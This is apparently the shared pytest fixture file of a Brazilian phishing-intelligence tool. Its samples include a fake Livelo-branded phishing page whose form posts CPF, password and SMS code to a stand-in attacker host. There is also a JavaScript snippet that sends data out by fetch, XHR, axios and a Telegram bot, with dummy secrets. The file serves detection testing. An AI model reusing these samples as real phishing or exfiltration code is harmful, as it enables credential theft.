"""Fixtures compartilhadas da suíte de testes.

Fornece artefatos de exemplo (HTML/JS), um certificado autoassinado real
gerado em memória, configuração de teste e um banco SQLite em arquivo
temporário. As fixtures são reutilizadas por testes unitários e de integração.
"""

from __future__ import annotations

import datetime

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

from phishing_intel.config.settings import AppConfig, DatabaseConfig
from phishing_intel.database.session import Database


@pytest.fixture
def sample_html() -> str:
    """HTML de exemplo de uma página de phishing (marca Livelo)."""
    return """
    <html>
      <head>
        <title>Livelo - Resgate seus pontos</title>
        <meta name="description" content="livelo pontos programa fidelidade">
        <!-- kit build v3 -->
      </head>
      <body>
        <img src="/assets/img/livelo-logo.png">
        <form action="https://coleta.evil.tld/gate.php" method="post">
          <label>CPF</label>
          <input name="cpf" placeholder="Digite seu CPF">
          <label>Senha</label>
          <input type="password" name="senha">
          <input type="text" name="token" placeholder="Codigo OTP via SMS">
          <input type="hidden" name="sid" value="1">
        </form>
        <link rel="stylesheet" href="/assets/css/style.css">
        <script src="/assets/js/app.min.js"></script>
        <a href="https://cdn.terceiro.tld/lib.js">lib</a>
      </body>
    </html>
    """


@pytest.fixture
def sample_js() -> str:
    """JavaScript de exemplo com exfiltração e segredo exposto."""
    return """
    fetch("https://coleta.evil.tld/result.php", {method:"POST", body: JSON.stringify(d)});
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://coleta.evil.tld/save.php");
    axios.post("https://api.coleta.evil.tld/api/log");
    $.ajax({url: "https://api.telegram.org/bot123:ABC/sendMessage"});
    var apiKey = "AIzaSyABCDEFGHIJKLMNOP1234567890xyzAB";
    var jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEFghiJKL";
    var mail = "drop@evil-inbox.tld";
    """


@pytest.fixture
def self_signed_pem() -> str:
    """Gera um certificado X.509 autoassinado real (PEM) para testes de SSL."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, "phishing.evil.tld"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Evil Corp"),
        ]
    )
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(1234567890)
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=30))
        .add_extension(
            x509.SubjectAlternativeName(
                [x509.DNSName("phishing.evil.tld"), x509.DNSName("www.evil.tld")]
            ),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.PEM).decode("utf-8")


@pytest.fixture
def test_config(tmp_path) -> AppConfig:
    """Configuração de teste com banco SQLite temporário e MISP desabilitado."""
    db_path = tmp_path / "test.db"
    config = AppConfig(database=DatabaseConfig(url=f"sqlite:///{db_path}"))
    config.evidence.storage_dir = str(tmp_path / "evidence")
    return config


@pytest.fixture
def database(test_config) -> Database:
    """Instância de banco de dados com esquema criado, pronta para uso."""
    db = Database(test_config.database)
    db.create_all()
    return db
